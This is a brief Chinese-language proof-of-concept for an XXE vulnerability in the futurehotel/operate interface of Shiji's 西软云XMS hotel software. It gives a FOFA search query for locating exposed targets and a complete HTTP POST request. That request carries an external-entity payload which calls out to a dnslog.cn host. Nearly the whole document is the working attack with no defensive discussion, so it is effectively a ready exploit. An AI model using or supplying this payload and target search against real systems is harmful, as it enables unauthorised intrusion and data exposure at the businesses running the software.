## 西软云XMS-futurehotel-operate接口存在XXE漏洞

## fofa
```
app="shiji-西软云XMS"
```

## poc
```
POST /XopServerRS/rest/futurehotel/operate HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.3157.54 Safari/537.36
Connection: close
Content-Type: text/xml
Accept-Encoding: gzip

<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://xxx.dnslog.cn"> %remote;]>
```
